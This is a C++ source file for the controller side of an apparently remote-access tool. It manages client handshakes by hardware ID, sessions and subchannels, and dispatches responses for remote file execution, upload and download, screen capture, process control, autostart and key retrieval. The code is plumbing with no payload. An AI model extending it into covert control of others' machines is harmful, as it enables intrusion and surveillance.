#include "AbstractProtocol.h"
#include "AApch.h"
#include "Controller.h"
#include "Protocols.h"
#include <debugapi.h>
#include <optional>
#include <utility>

#define CASE_AND_EMIT(pt, sig)                                                 \
  case (Packet::Type)pt::PacketType:                                           \
    emit sig(parser.header, std::dynamic_pointer_cast<pt>(parser.body));       \
    break;

void Network::IPacketNotify::dispatch(const Packet::Parser &parser) {
  auto type = parser.header->type;

  auto timestamp = std::chrono::duration_cast<std::chrono::milliseconds>(
                       std::chrono::system_clock::now().time_since_epoch())
                       .count();
  emit lag(timestamp - parser.header->timestamp);

  // Dispatch request
  switch (type) {
    CASE_AND_EMIT(Packet::ResponseInformation, recvInformation);
    CASE_AND_EMIT(Packet::ResponseDeleteFile, recvDeleteFile);
    CASE_AND_EMIT(Packet::ResponseDownloadFile, recvDownloadFile);
    CASE_AND_EMIT(Packet::ResponseExecuteFile, recvExecuteFile);
    CASE_AND_EMIT(Packet::ResponseGetProcess, recvGetProcess);
    CASE_AND_EMIT(Packet::ResponseQueryFile, recvQueryFile);
    CASE_AND_EMIT(Packet::ResponseQueryProgram, recvQueryProgram);
    CASE_AND_EMIT(Packet::ResponseReinitialize, recvReinitialize);
    CASE_AND_EMIT(Packet::ResponseRemoteScreen, recvRemoteScreen);
    CASE_AND_EMIT(Packet::ResponseStartProcess, recvStartProcess);
    CASE_AND_EMIT(Packet::ResponseTaskAutoStart, recvTaskAutoStart);
    CASE_AND_EMIT(Packet::ResponseTerminateProcess, recvTerminateProcess);
    CASE_AND_EMIT(Packet::ResponseUploadFile, recvUploadFile);
    CASE_AND_EMIT(Packet::ResponseGetKey, recvGetKey);
    CASE_AND_EMIT(Packet::ResponseHeartbeat, recvHeartbeat);
  default:
    spdlog::error("bug detected, unhandled request");
    assert(false);
    break;
  }
}

void Network::IConnectionNotify::emitClientConnected(Controller *controller) {
  emit clientConnected(controller);
}

void Network::IConnectionNotify::emitClientDisconnected(
    Controller *controller) {
  emit clientDisconnected(controller);
}

Network::AbstractHandler::AbstractHandler() {}

Network::AbstractHandler::~AbstractHandler() {
  for (auto &client : clients) {
    client.second->deleteLater();
  }

  clients.clear();

  for (auto &session : pending_queue) {
    session->shutdown();

    // Because the handler already shutdown, it can not delete session after
    // dtor anymore. So we have to delete it manually
    session->deleteSelf();
  }

  pending_queue.clear();
}

Network::Controller *
Network::AbstractHandler::getClient(const std::string &hwid) const noexcept {
  try {
    return clients.at(hwid);
  } catch (const std::exception &) {
    // The controller is deleted, we can not find
    return nullptr;
  }
}

Network::Controller *
Network::AbstractHandler::getClient(AbstractSession *session) const noexcept {
  return getClient(session->getHwid());
}

bool Network::AbstractHandler::addPendingSession(
    AbstractSession *session) noexcept {
  try {
    pending_queue.push_back(session);

    spdlog::debug(
        "new session {} established connection, current pending count: {}",
        fmt::ptr(session), getPendingCount());
  } catch (const std::exception &) {
    spdlog::error("can not add pending session {}", fmt::ptr(session));
    return false;
  }

  return true;
}

bool Network::AbstractHandler::removeSession(AbstractSession *session) {
  spdlog::debug("session {} shutdown connection", fmt::ptr(session));

  // Recognized as a valid session
  if (session->isInvalid() == false) {
    // If session is a controller, delete it from clients
    if (session->isController()) {
      spdlog::info("client {}({}) disconnected", session->getRemoteAddress(),
                   fmt::ptr(session));

      // Get controller object
      auto controller = getClient(session);

      // Delete from clients
      clients.erase(session->getHwid());

      // Notify controller
      notifier.emitClientDisconnected(controller);

      // Delete from memory
      controller->deleteLater();
    } else {
      spdlog::debug("subchannel disconnected");

      // Get controller object
      auto controller = getClient(session->getHwid());

      // If controller is not deleted
      if (controller != nullptr) {
        spdlog::debug("controller is still alive, calling to delete");

        // Delete from controller
        controller->removeSubChannel(session);
      }
    }
  }

  // If the session not initialized, delete it from pending queue
  if (session->isHandshaked() == false) {
    spdlog::debug("unhandshaked session, removing from pending queue");

    // Find the session in queue
    auto iter = std::find(pending_queue.begin(), pending_queue.end(), session);
    if (iter == pending_queue.cend()) {
      spdlog::error("bug detected, trying to remove a non-exist session");
      assert(false);
      return false;
    }

    // Delete from memory
    (*iter)->deleteSelf();

    // Remove from queue
    pending_queue.erase(iter);
  }

  return true;
}

bool Network::AbstractHandler::migratePendingSession(AbstractSession *session) {
  spdlog::debug("migrating session {}", fmt::ptr(session));

  // Basic check
  if (session->isHandshaked() == false) {
    spdlog::error("bug detected, trying to migrate a unhandshaked session");
    assert(false);
    return false;
  }

  // Find the session in queue
  auto iter = std::find(pending_queue.cbegin(), pending_queue.cend(), session);
  if (iter == pending_queue.cend()) {
    spdlog::error("bug detected, trying to migrate a non-exist session");
    assert(false);
    return false;
  }

  // Remove the session from pending queue
  pending_queue.erase(iter);

  // If role is controller
  if (session->isController()) {
    auto debug = session->getRemoteAddress();
    spdlog::info("client {}({}) connected", session->getRemoteAddress(),
                 fmt::ptr(session));

    // Construct controller
    auto controller = new Controller(session);

    // Add the session to controller
    clients[session->getHwid()] = controller;

    // Notify new controller
    notifier.emitClientConnected(controller);
  }
  // Or we are a channel session
  else {
    spdlog::debug("subchannel connected");

    // Get the hwid for the session and get controller
    auto controller = getClient(session->getHwid());

    // Add the subchannel to controller
    controller->addSubChannel(session);
  }

  return true;
}

Network::AbstractSession::AbstractSession(AbstractHandler *handler)
    : handler(handler) {
  spdlog::debug("session {} ctor", fmt::ptr(this));
}

Network::AbstractSession::~AbstractSession() {
  spdlog::debug("session {} dtor", fmt::ptr(this));

  handler = nullptr;

  status = invalid;

  role = Packet::Handshake::Role::invalid;

  hwid.clear();
  handshake_id.clear();
  pending_packets.clear();
}

std::optional<QFuture<std::pair<std::shared_ptr<Packet::Header>,
                                std::shared_ptr<Packet::AbstractPacket>>>>
Network::AbstractSession::sendJsonPacket(
    const Packet::AbstractGenerator &packet) noexcept {
  auto id = packet.getId();

  if (sendJsonPacketInternal(packet) == true) {
    auto &task = pending_packets[id];
    return task.future();
  } else {
    return std::nullopt;
  }
}

bool Network::AbstractSession::onReceivedPacket(const std::string &buffer) {
  // Parse the request
  Packet::Parser parser;
  if (parser.parseJson(buffer) == false) {
    spdlog::error("error when parsing packet");
    return false;
  }

  auto type = parser.header->type;
  const auto &id = parser.header->id;

  spdlog::debug(
      "received packet in session {} with type: {}, id: {} in raw size: {} kb",
      fmt::ptr(this), magic_enum::enum_name(type), id,
      (double)buffer.size() / 1024);

  if (type == Packet::Type::handshake) {
    // If session is initialized, reject all re-initialization
    if (isHandshaked()) {
      spdlog::error("session initialized but still sending handshake");
      shutdown();
      return false;
    }

    auto packet = std::dynamic_pointer_cast<Packet::Handshake>(parser.body);
    role = packet->role;

    // Set hwid
    hwid = packet->message;

    // Set handshake id
    handshake_id = id;

    // If role is controller, initialize the session
    if (isController()) {
      spdlog::debug("client initializing");
    }
    // Or we are a channel session
    else {
      spdlog::debug("{} subchannel initializing", magic_enum::enum_name(role));
    }

    // Once all initialization operation completed, flag our session
    setStatus(handshaked);

    // After our initialization, call the handler to evaluate us
    handler->migratePendingSession(this);

    return true;
  }

  // If remote sends request before initialization
  if (isHandshaked() == false) {
    spdlog::error("sending request before initialization");
    shutdown();
    return false;
  }

  try {
    auto packet = std::move(pending_packets.at(id));
    pending_packets.erase(id);
    packet.addResult(std::make_pair(parser.header, parser.body));
    packet.finish();
  } catch (const std::exception &) {
  }

  try {
    notifier.dispatch(parser);
  } catch (const std::exception &) {
    spdlog::error("exception occurred when processing the packet");
  }

  return true;
}